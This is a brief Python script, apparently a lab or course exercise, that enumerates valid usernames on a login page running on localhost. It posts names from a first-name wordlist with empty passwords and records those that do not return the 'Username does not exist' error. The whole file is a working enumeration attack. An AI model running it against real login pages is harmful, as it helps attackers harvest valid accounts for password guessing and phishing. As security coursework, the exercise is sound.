import os, requests

url = 'http://127.0.0.1:5000/login'
nameList = open('/A1/facebook-firstnames.txt', 'r')
foundUsernames = open('found_usernames.txt', 'a')

with requests.Session() as session:
	for name in nameList:
		name = name.strip('\n')
		payload = {'username': name, 'password': ''}
		r = requests.post(url, payload)
		errorLine = r.text.splitlines()[59]
		if not errorLine.lstrip().startswith("Error. Username does not exist."):
			print("Username found: " + name)
			foundUsernames.writelines(name + '\n')
				
nameList.close()
foundUsernames.close()